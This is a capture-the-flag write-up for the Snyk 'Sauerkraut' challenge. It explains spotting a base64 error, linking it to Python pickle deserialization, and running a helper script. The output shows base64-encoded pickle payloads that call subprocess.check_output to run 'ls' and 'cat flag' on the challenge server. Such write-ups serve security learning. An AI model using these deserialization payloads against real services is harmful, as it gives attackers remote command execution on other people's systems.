# Sauerkraut

What goes best on a hotdog?

## Objective

There is a form page, in which, after a number of try with some string, we receive in output this string

*Invalid base64-encoded string: number of data characters (13) cannot be 1 more than a multiple of 4*

## Resources

***Link***: https://ctf-101.snyk.io/challenges#Sauerkraut

***Server**: http://35.211.215.131:8000/

## Hint

This error could make us think about a vulnerability regarding python and a string base 64. If we google: *python base64 pickles vuln*

Google will give us as first result this url: https://davidhamann.de/2020/04/05/exploiting-python-pickle/

This article has a similar case that could be helpful for us

## Solution

Reading this article: https://davidhamann.de/2020/04/05/exploiting-python-pickle/ could help us to understand how to pass the correct string to the form and run bash command on the target amachine.

I made a small script script.py that could trasform all the command serializing them.

This are the steps to take

```
python3.9 script.py 'ls'
string not base 64b'\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x0ccheck_output\x94\x93\x94]\x94\x8c\x02ls\x94a\x85\x94R\x94.'
string base64 b'gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlIwCbHOUYYWUUpQu'
```

```
python3.9 script.py 'cat flag'
string not base 64b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x0ccheck_output\x94\x93\x94]\x94(\x8c\x03cat\x94\x8c\x04flag\x94e\x85\x94R\x94.'
string base64 b'gASVNAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMA2NhdJSMBGZsYWeUZYWUUpQu'
```

